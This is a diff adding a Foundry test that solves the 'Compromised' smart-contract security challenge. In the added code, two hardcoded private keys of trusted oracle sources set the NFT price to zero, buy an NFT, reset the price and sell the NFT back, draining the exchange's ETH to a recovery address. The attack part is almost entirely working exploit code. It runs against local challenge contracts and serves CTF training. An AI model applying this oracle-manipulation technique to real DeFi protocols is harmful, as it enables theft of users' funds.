@@ -9,6 +9,8 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -73,7 +75,34 @@ contract CompromisedChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_compromised() public checkSolved {}
+    function test_compromised() public checkSolved {
+        uint256 pk1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+        uint256 pk2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+
+        address src1 = vm.addr(pk1);
+        address src2 = vm.addr(pk2);
+
+        NFTReceiver nftReceiver = new NFTReceiver();
+
+        vm.prank(src1);
+        oracle.postPrice(symbols[0], 0);
+
+        vm.prank(src2);
+        oracle.postPrice(symbols[0], 0);
+
+        uint256 id = nftReceiver.buy{value: PLAYER_INITIAL_ETH_BALANCE}(address(exchange));
+
+        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
+
+        vm.prank(src1);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+
+        vm.prank(src2);
+        oracle.postPrice(symbols[0], INITIAL_NFT_PRICE);
+
+        nftReceiver.sell(address(exchange), address(nft), id);
+        nftReceiver.transfer(recovery);
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -91,4 +120,29 @@ contract CompromisedChallenge is Test {
         // NFT price didn't change
         assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
     }
+}
+
+contract NFTReceiver is IERC721Receiver {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        returns (bytes4)
+    {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    function buy(address exchange) external payable returns (uint256 id) {
+        return Exchange(payable(exchange)).buyOne{value: msg.value}();
+    }
+
+    function sell(address exchange, address nft, uint256 id) external {
+        IERC721(nft).approve(exchange, id);
+        Exchange(payable(exchange)).sellOne(id);
+    }
+
+    function transfer(address to) external {
+        (bool ok,) = to.call{value: 999 ether}("");
+        require(ok);
+    }
+
+    receive() external payable {}
 }
